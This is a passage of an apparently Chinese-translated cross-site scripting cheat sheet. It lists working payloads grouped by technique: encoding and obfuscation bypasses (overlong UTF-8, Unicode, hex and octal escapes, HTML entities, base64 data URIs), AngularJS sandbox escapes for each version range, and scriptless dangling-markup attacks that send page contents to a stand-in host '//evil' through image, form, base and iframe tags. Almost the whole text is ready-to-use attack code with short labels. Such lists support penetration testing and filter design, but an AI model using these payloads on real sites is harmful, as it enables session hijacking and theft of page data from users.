<pre><code class="hljs gcode"><span class="hljs-meta">%</span>C<span class="hljs-number">0</span><span class="hljs-meta">%</span>BCscript&gt;alert<span class="hljs-comment">(1)</span>&lt;/script&gt;
<span class="hljs-meta">%</span>E<span class="hljs-number">0</span><span class="hljs-meta">%</span><span class="hljs-number">80</span><span class="hljs-meta">%</span>BCscript&gt;alert<span class="hljs-comment">(1)</span>&lt;/script&gt;
<span class="hljs-meta">%</span>F<span class="hljs-number">0</span><span class="hljs-meta">%</span><span class="hljs-number">80</span><span class="hljs-meta">%</span><span class="hljs-number">80</span><span class="hljs-meta">%</span>BCscript&gt;alert<span class="hljs-comment">(1)</span>&lt;/script&gt;
<span class="hljs-meta">%</span>F<span class="hljs-number">8</span><span class="hljs-meta">%</span><span class="hljs-number">80</span><span class="hljs-meta">%</span><span class="hljs-number">80</span><span class="hljs-meta">%</span><span class="hljs-number">80</span><span class="hljs-meta">%</span>BCscript&gt;alert<span class="hljs-comment">(1)</span>&lt;/script&gt;
<span class="hljs-meta">%</span>FC<span class="hljs-meta">%</span><span class="hljs-number">80</span><span class="hljs-meta">%</span><span class="hljs-number">80</span><span class="hljs-meta">%</span><span class="hljs-number">80</span><span class="hljs-meta">%</span><span class="hljs-number">80</span><span class="hljs-meta">%</span>BCscript&gt;alert<span class="hljs-comment">(1)</span>&lt;/script&gt;</code></pre>

<p>Unicode转义</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>\u0061lert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>

<p>Unicode转义ES6样式</p>
<pre><code class="hljs dust"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>\u</span><span class="hljs-template-variable">&#123;61&#125;</span><span class="xml">lert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span></code></pre>

<p>Unicode转义ES6样式零填充</p>
<pre><code class="hljs dust"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>\u</span><span class="hljs-template-variable">&#123;0000000061&#125;</span><span class="xml">lert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span></code></pre>

<p>十六进制编码JavaScript转义</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;\x61lert(1)&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>

<p>八进制编码</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;\141lert(1)&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;alert(\061)&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;alert(\61)&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>

<p>带有可选分号的十进制编码</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;<span class="hljs-symbol">&amp;#106;</span>avascript:alert(1)&quot;</span>&gt;</span>XSS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&amp;#106avascript:alert(1)&quot;</span>&gt;</span>XSS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre>

<p>带有HTML编码的SVG脚本</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="handlebars"><span class="xml"><span class="hljs-symbol">&amp;#97;</span>lert(1)</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">svg</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="handlebars"><span class="xml"><span class="hljs-symbol">&amp;#x61;</span>lert(1)</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">svg</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="handlebars"><span class="xml">alert<span class="hljs-symbol">&amp;NewLine;</span>(1)</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">svg</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">x=<span class="hljs-string">&quot;&amp;quot;,alert(1)//&quot;</span>;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span></code></pre>

<p>带填充零的十进制编码</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&amp;#0000106avascript:alert(1)&quot;</span>&gt;</span>XSS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre>

<p>十六进制编码实体</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;<span class="hljs-symbol">&amp;#x6a;</span>avascript:alert(1)&quot;</span>&gt;</span>XSS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre>

<p>如果下一个字符不是a-f0-9，则不使用分号的十六进制编码</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;j&amp;#x61vascript:alert(1)&quot;</span>&gt;</span>XSS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&amp;#x6a</span></span>
<span class="hljs-tag"><span class="hljs-string">avascript:alert(1)&quot;</span>&gt;</span>XSS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&amp;#x6a avascript:alert(1)&quot;</span>&gt;</span>XSS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre>

<p>带填充零的十六进制编码</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;<span class="hljs-symbol">&amp;#x0000006a;</span>avascript:alert(1)&quot;</span>&gt;</span>XSS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre>

<p>十六进制编码不区分大小写</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;<span class="hljs-symbol">&amp;#X6A;</span>avascript:alert(1)&quot;</span>&gt;</span>XSS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre>

<p>HTML实体</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript<span class="hljs-symbol">&amp;colon;</span>alert(1)&quot;</span>&gt;</span>XSS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;java<span class="hljs-symbol">&amp;Tab;</span>script:alert(1)&quot;</span>&gt;</span>XSS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;java<span class="hljs-symbol">&amp;NewLine;</span>script:alert(1)&quot;</span>&gt;</span>XSS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript<span class="hljs-symbol">&amp;colon;</span>alert<span class="hljs-symbol">&amp;lpar;</span>1<span class="hljs-symbol">&amp;rpar;</span>&quot;</span>&gt;</span>XSS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre>

<p>网址编码</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript:x=&#x27;%27-alert(1)-%27&#x27;;&quot;</span>&gt;</span>XSS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre>

<p>HTML实体和URL编码</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript:x=&#x27;<span class="hljs-symbol">&amp;percnt;</span>27-alert(1)-%27&#x27;;&quot;</span>&gt;</span>XSS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre>

<h3 id="混淆"><a href="#混淆" class="headerlink" title="混淆"></a>混淆</h3><p>Firefox在＆之后允许NULL</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript<span class="hljs-symbol">&amp;#x6a;</span>avascript:alert(1)&quot;</span>&gt;</span>Firefox<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre>

<p>Firefox允许在命名实体内使用NULL</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript<span class="hljs-symbol">&amp;colon;</span>alert(1)&quot;</span>&gt;</span>Firefox<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre>

<p>Firefox在开头的注释中允许使用NULL字符</p>
<pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- &gt;&lt;img title=&quot;--&gt;</span>&lt;iframe/onload=alert(1)&gt;&quot;&gt; --&gt;
<span class="hljs-comment">&lt;!-- &gt;&lt;img title=&quot;--&gt;</span>&lt;iframe/onload=alert(1)&gt;&quot;&gt; --&gt;</code></pre>

<p>带有base64的脚本src中的数据协议</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">data:text/javascript;base64,YWxlcnQoMSk</span>=&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>

<h3 id="客户端模板注入"><a href="#客户端模板注入" class="headerlink" title="客户端模板注入"></a>客户端模板注入</h3><p><strong>AngularJS沙箱逃逸</strong></p>
<p>版本：1.0.1-1.1.5</p>
<pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">constructor.constructor</span>(<span class="hljs-name">&#x27;alert(1)&#x27;</span>)()&#125;&#125;</span></code></pre>

<p>版本：1.0.1-1.1.5（较短）</p>
<pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">$on.constructor</span>(<span class="hljs-name">&#x27;alert(1)&#x27;</span>)()&#125;&#125;</span></code></pre>

<p>版本：1.2.0-1.2.1</p>
<pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">a</span>=<span class="hljs-string">&#x27;constructor&#x27;</span>;<span class="hljs-attr">b</span>=&#123;&#125;;a.sub.call.call(<span class="hljs-name">b[a].getOwnPropertyDescriptor</span>(<span class="hljs-name">b[a].getPrototypeOf</span>(<span class="hljs-name">a.sub</span>),a).value,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;alert(1)&#x27;</span>)()&#125;&#125;</span></code></pre>

<p>版本：1.2.2-1.2.5</p>
<pre><code class="hljs clojure">&#123;&#123;&#123;&#125;.<span class="hljs-string">&quot;)));alert(1)//&quot;</span>&#125;&#125;</code></pre>

<p>版本：1.2.6-1.2.18</p>
<pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;(<span class="hljs-name">_</span>=<span class="hljs-string">&#x27;&#x27;</span>.sub).call.call(&#123;&#125;<span class="hljs-name">[$=&#x27;constructor&#x27;].getOwnPropertyDescriptor</span>(<span class="hljs-name">_.__proto__</span>,$).value,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;alert(1)&#x27;</span>)()&#125;&#125;</span></code></pre>

<p>版本：1.2.19-1.2.23</p>
<pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">toString.constructor.prototype.toString</span>=toString.constructor.prototype.call;[&quot;a&quot;,&quot;alert(1)&quot;].sort(<span class="hljs-name">toString.constructor</span>);&#125;&#125;</span></code></pre>

<p>版本：1.2.24-1.2.29</p>
<pre><code class="hljs clojure">&#123;&#123;&#123;&#125;.<span class="hljs-string">&quot;)));alert(1)//&quot;</span>&#125;&#125;</code></pre>

<p>版本：1.2.27-1.2.29/1.3.0-1.3.20</p>
<pre><code class="hljs clojure">&#123;&#123;&#123;&#125;.<span class="hljs-string">&quot;)));alert(1)//&quot;</span>&#125;&#125;</code></pre>

<p>版本：1.3.0</p>
<pre><code class="hljs sas">&#123;&#123;!ready <span class="hljs-variable">&amp;&amp;</span> (ready = true) <span class="hljs-variable">&amp;&amp;</span> (
!<span class="hljs-meta">call</span>
? $$watchers[0].get(toString.constructor.prototype)
: (a = apply) <span class="hljs-variable">&amp;&amp;</span>
(apply = constructor) <span class="hljs-variable">&amp;&amp;</span>
(valueOf = <span class="hljs-meta">call</span>) <span class="hljs-variable">&amp;&amp;</span>
(<span class="hljs-string">&#x27;&#x27;</span>+<span class="hljs-string">&#x27;&#x27;</span>.toString(
<span class="hljs-string">&#x27;F = Function.prototype;&#x27;</span> +
<span class="hljs-string">&#x27;F.apply = F.a;&#x27;</span> +
<span class="hljs-string">&#x27;delete F.a;&#x27;</span> +
<span class="hljs-string">&#x27;delete F.valueOf;&#x27;</span> +
<span class="hljs-string">&#x27;alert(1);&#x27;</span>
)));&#125;&#125;</code></pre>

<p>版本：1.3.3-1.3.18</p>
<pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;&#123;&#125;<span class="hljs-name">[&#123;toString:[].join</span>,length:1,<span class="hljs-number">0</span>:&#x27;__proto__&#x27;&#125;].assign=[].join;<span class="hljs-string">&#x27;a&#x27;</span>.constructor.prototype.charAt=[].join;$eval(<span class="hljs-name">&#x27;x=alert(1)//&#x27;</span>);&#125;&#125;</span></code></pre>

<p>版本：1.3.19</p>
<pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;a&#x27;[&#123;toString:false,valueOf:[].join</span>,length:1,<span class="hljs-number">0</span>:&#x27;__proto__&#x27;&#125;].charAt=[].join;$eval(<span class="hljs-name">&#x27;x=alert(1)//&#x27;</span>);&#125;&#125;</span></code></pre>

<p>版本：1.3.20</p>
<pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;a&#x27;.constructor.prototype.charAt</span>=[].join;$eval(<span class="hljs-name">&#x27;x=alert(1)&#x27;</span>);&#125;&#125;</span></code></pre>

<p>版本：1.4.0-1.4.9</p>
<pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;a&#x27;.constructor.prototype.charAt</span>=[].join;$eval(<span class="hljs-name">&#x27;x=1&#125; &#125; &#125;;alert(1)//&#x27;</span>);&#125;&#125;</span></code></pre>

<p>版本：1.5.0-1.5.8</p>
<pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">x</span>=&#123;<span class="hljs-string">&#x27;y&#x27;</span>:&#x27;&#x27;.constructor.prototype&#125;;x[&#x27;y&#x27;].charAt=[].join;$eval(<span class="hljs-name">&#x27;x=alert(1)&#x27;</span>);&#125;&#125;</span></code></pre>

<p>版本：1.5.9-1.5.11</p>
<pre><code class="hljs powershell">&#123;&#123;
c=<span class="hljs-string">&#x27;&#x27;</span>.sub.call;b=<span class="hljs-string">&#x27;&#x27;</span>.sub.bind;a=<span class="hljs-string">&#x27;&#x27;</span>.sub.apply;
c.<span class="hljs-variable">$apply</span>=<span class="hljs-variable">$apply</span>;c.<span class="hljs-variable">$eval</span>=b;op=<span class="hljs-variable">$root</span>.<span class="hljs-variable">$</span><span class="hljs-variable">$phase</span>;
<span class="hljs-variable">$root</span>.<span class="hljs-variable">$</span><span class="hljs-variable">$phase</span>=null;od=<span class="hljs-variable">$root</span>.<span class="hljs-variable">$digest</span>;<span class="hljs-variable">$root</span>.<span class="hljs-variable">$digest</span>=(&#123;&#125;).toString;
C=c.<span class="hljs-variable">$apply</span>(c);<span class="hljs-variable">$root</span>.<span class="hljs-variable">$</span><span class="hljs-variable">$phase</span>=op;<span class="hljs-variable">$root</span>.<span class="hljs-variable">$digest</span>=od;
B=C(b,c,b);<span class="hljs-variable">$evalAsync</span>(<span class="hljs-string">&quot;</span>
<span class="hljs-string">astNode=pop();astNode.type=&#x27;UnaryExpression&#x27;;</span>
<span class="hljs-string">astNode.operator=&#x27;(window.X?void0:(window.X=true,alert(1)))+&#x27;;</span>
<span class="hljs-string">astNode.argument=&#123;type:&#x27;Identifier&#x27;,name:&#x27;foo&#x27;&#125;;</span>
<span class="hljs-string">&quot;</span>);
m1=B(<span class="hljs-variable">$</span><span class="hljs-variable">$asyncQueue</span>.pop().expression,null,<span class="hljs-variable">$root</span>);
m2=B(C,null,m1);[].push.apply=m2;a=<span class="hljs-string">&#x27;&#x27;</span>.sub;
<span class="hljs-variable">$eval</span>(<span class="hljs-string">&#x27;a(b.c)&#x27;</span>);[].push.apply=a;
&#125;&#125;</code></pre>

<p>版本：&gt; = 1.6.0</p>
<pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">constructor.constructor</span>(<span class="hljs-name">&#x27;alert(1)&#x27;</span>)()&#125;&#125;</span></code></pre>

<p>版本：&gt; = 1.6.0（较短）</p>
<pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">$on.constructor</span>(<span class="hljs-name">&#x27;alert(1)&#x27;</span>)()&#125;&#125;</span></code></pre>

<p><strong>基于DOM的AngularJS沙箱逃逸</strong></p>
<p>所有版本（Chrome）</p>
<pre><code class="hljs routeros">&lt;input autofocus <span class="hljs-attribute">ng-focus</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$event</span>.path|orderBy:&#x27;[].constructor.from([1],alert)&#x27;&quot;</span>&gt;</code></pre>

<p>所有版本（Chrome）较短</p>
<pre><code class="hljs routeros">&lt;input <span class="hljs-attribute">id</span>=x <span class="hljs-attribute">ng-focus</span>=<span class="hljs-variable">$event</span>.path|orderBy:&#x27;(z=alert)(1)&#x27;&gt;</code></pre>

<p>所有版本（所有浏览器）都较短</p>
<pre><code class="hljs routeros">&lt;input autofocus <span class="hljs-attribute">ng-focus</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$event</span>.composedPath()|orderBy:&#x27;[].constructor.from([1],alert)&#x27;&quot;</span>&gt;</code></pre>

<p>版本：1.2.0-1.5.0</p>
<pre><code class="hljs handlebars"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">ng-app</span> <span class="hljs-attr">ng-csp</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">ng-focus</span>=<span class="hljs-string">&quot;x=$event;&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">f</span> <span class="hljs-attr">tabindex</span>=<span class="hljs-string">0</span>&gt;</span>foo<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">ng-repeat</span>=<span class="hljs-string">&quot;(key, value) in x.view&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">ng-if</span>=<span class="hljs-string">&quot;key == &#x27;window&#x27;&quot;</span>&gt;</span></span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">[1].reduce</span>(<span class="hljs-name">value.alert</span>, <span class="hljs-number">1</span>); &#125;&#125;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span></code></pre>

<h3 id="无脚本攻击"><a href="#无脚本攻击" class="headerlink" title="无脚本攻击"></a>无脚本攻击</h3><p>背景属性</p>
<pre><code class="hljs stata">&lt;body background=&quot;<span class="hljs-comment">//evil?</span>
&lt;<span class="hljs-keyword">table</span> background=&quot;<span class="hljs-comment">//evil?</span>
&lt;<span class="hljs-keyword">table</span>&gt;&lt;thead background=&quot;<span class="hljs-comment">//evil?</span>
&lt;<span class="hljs-keyword">table</span>&gt;&lt;tbody background=&quot;<span class="hljs-comment">//evil?</span>
&lt;<span class="hljs-keyword">table</span>&gt;&lt;tfoot background=&quot;<span class="hljs-comment">//evil?</span>
&lt;<span class="hljs-keyword">table</span>&gt;&lt;td background=&quot;<span class="hljs-comment">//evil?</span>
&lt;<span class="hljs-keyword">table</span>&gt;&lt;th background=&quot;<span class="hljs-comment">//evil?</span></code></pre>

<p>链接href样式表</p>
<pre><code class="hljs routeros">&lt;link <span class="hljs-attribute">rel</span>=stylesheet <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;//evil?</span></code></pre>

<p>链接href图标</p>
<pre><code class="hljs routeros">&lt;link <span class="hljs-attribute">rel</span>=icon <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;//evil?</span></code></pre>

<p>Meta刷新</p>
<pre><code class="hljs routeros">&lt;meta <span class="hljs-attribute">http-equiv</span>=<span class="hljs-string">&quot;refresh&quot;</span> <span class="hljs-attribute">content</span>=<span class="hljs-string">&quot;0; http://evil?</span></code></pre>

<p>Img通过src属性传递标记</p>
<pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;//evil?</span>
<span class="hljs-string">&lt;image src=&quot;</span>//evil?</code></pre>

<p>使用track元素的视频</p>
<pre><code class="hljs haskell">&lt;video&gt;&lt;track <span class="hljs-keyword">default</span> src=&quot;//evil?</code></pre>

<p>使用sourcr元素和src属性的视频</p>
<pre><code class="hljs vim"><span class="hljs-symbol">&lt;video&gt;</span>&lt;<span class="hljs-keyword">source</span> src=<span class="hljs-comment">&quot;//evil?</span></code></pre>

<p>使用source元素和src属性的音频</p>
<pre><code class="hljs vim"><span class="hljs-symbol">&lt;audio&gt;</span>&lt;<span class="hljs-keyword">source</span> src=<span class="hljs-comment">&quot;//evil?</span></code></pre>

<p>输入src</p>
<pre><code class="hljs routeros">&lt;input <span class="hljs-attribute">type</span>=image <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;//evil?</span></code></pre>

<p>使用formaction的按钮</p>
<pre><code class="hljs routeros">&lt;form&gt;&lt;button <span class="hljs-attribute">style</span>=<span class="hljs-string">&quot;width:100%;height:100%&quot;</span> <span class="hljs-attribute">type</span>=submit <span class="hljs-attribute">formaction</span>=<span class="hljs-string">&quot;//evil?</span></code></pre>

<p>使用formaction输入</p>
<pre><code class="hljs routeros">&lt;form&gt;&lt;input <span class="hljs-attribute">type</span>=submit <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot;XSS&quot;</span> <span class="hljs-attribute">style</span>=<span class="hljs-string">&quot;width:100%;height:100%&quot;</span> <span class="hljs-attribute">type</span>=submit <span class="hljs-attribute">formaction</span>=<span class="hljs-string">&quot;//evil?</span></code></pre>

<p>表单使用action</p>
<pre><code class="hljs routeros">&lt;button <span class="hljs-attribute">form</span>=x <span class="hljs-attribute">style</span>=<span class="hljs-string">&quot;width:100%;height:100%;&quot;</span>&gt;&lt;form <span class="hljs-attribute">id</span>=x <span class="hljs-attribute">action</span>=<span class="hljs-string">&quot;//evil?</span></code></pre>

<p>使用src属性的Isindex</p>
<pre><code class="hljs routeros">&lt;isindex <span class="hljs-attribute">type</span>=image <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;//evil?</span></code></pre>

<p>Isindex使用submit</p>
<pre><code class="hljs routeros">&lt;isindex <span class="hljs-attribute">type</span>=submit <span class="hljs-attribute">style</span>=width:100%;height:100%; <span class="hljs-attribute">value</span>=XSS <span class="hljs-attribute">formaction</span>=<span class="hljs-string">&quot;//evil?</span></code></pre>

<p>Object data</p>
<pre><code class="hljs haskell">&lt;object <span class="hljs-class"><span class="hljs-keyword">data</span>=&quot;//evil?</span></code></pre>

<p>iframe src</p>
<pre><code class="hljs 1c">&lt;iframe src=<span class="hljs-string">&quot;//evil?</span></code></pre>

<p>Embed src</p>
<pre><code class="hljs 1c">&lt;embed src=<span class="hljs-string">&quot;//evil?</span></code></pre>

<p>使用textarea标记并发布到外部站点</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">formaction</span>=<span class="hljs-string">//evil</span>&gt;</span>XSS<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">textarea</span> <span class="hljs-attr">name</span>=<span class="hljs-string">x</span>&gt;</span></code></pre>

<p>使用表单目标通过window.name传递标记数据</p>
<pre><code class="hljs routeros">&lt;button <span class="hljs-attribute">form</span>=x&gt;XSS&lt;/button&gt;&lt;form <span class="hljs-attribute">id</span>=x <span class="hljs-attribute">action</span>=//evil <span class="hljs-attribute">target</span>=<span class="hljs-string">&#x27;</span></code></pre>

<p>使用基本目标通过window.name传递标记数据</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">http://subdomain1.portswigger-labs.net/dangling_markup/name.html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">font</span> <span class="hljs-attr">size</span>=<span class="hljs-string">100</span> <span class="hljs-attr">color</span>=<span class="hljs-string">red</span>&gt;</span>You must click me<span class="hljs-tag">&lt;/<span class="hljs-name">font</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">base</span> <span class="hljs-attr">target</span>=<span class="hljs-string">&quot;</span></span></code></pre>

<p>使用formtarget通过window.name传递标记数据</p>
<pre><code class="hljs routeros">&lt;form&gt;&lt;input <span class="hljs-attribute">type</span>=submit <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot;Click me&quot;</span> <span class="hljs-attribute">formaction</span>=http://subdomain1.portswigger-labs.net/dangling_markup/name.html <span class="hljs-attribute">formtarget</span>=<span class="hljs-string">&quot;</span></code></pre>

<p>使用基本href传递数据</p>
<pre><code class="hljs routeros">&lt;a <span class="hljs-attribute">href</span>=abc <span class="hljs-attribute">style</span>=<span class="hljs-string">&quot;width:100%;height:100%;position:absolute;font-size:1000px;&quot;</span>&gt;xss&lt;base <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;//evil/</span></code></pre>

<p>使用embed src从页面传递数据</p>
<pre><code class="hljs awk">&lt;embed src=http:<span class="hljs-regexp">//</span>subdomain1.portswigger-labs.net<span class="hljs-regexp">/dangling_markup/</span>name.html name=<span class="hljs-string">&quot;</span></code></pre>

<p>使用iframe窗口名称从页面传递数据</p>
<pre><code class="hljs awk">&lt;iframe src=http:<span class="hljs-regexp">//</span>subdomain1.portswigger-labs.net<span class="hljs-regexp">/dangling_markup/</span>name.html name=<span class="hljs-string">&quot;</span></code></pre>

<p>使用object窗口名称从页面传递数据</p>
<pre><code class="hljs awk">&lt;object data=http:<span class="hljs-regexp">//</span>subdomain1.portswigger-labs.net<span class="hljs-regexp">/dangling_markup/</span>name.html name=<span class="hljs-string">&quot;</span></code></pre>

<p>使用frameset窗口名称从页面传递数据</p>
<pre><code class="hljs awk">&lt;frameset&gt;&lt;frame src=http:<span class="hljs-regexp">//</span>subdomain1.portswigger-labs.net<span class="hljs-regexp">/dangling_markup/</span>name.html name=<span class="hljs-string">&quot;</span></code></pre>

<h3 id="多语言有效载荷"><a href="#多语言有效载荷" class="headerlink" title="多语言有效载荷"></a>多语言有效载荷</h3><p>多语言有效载荷1</p>
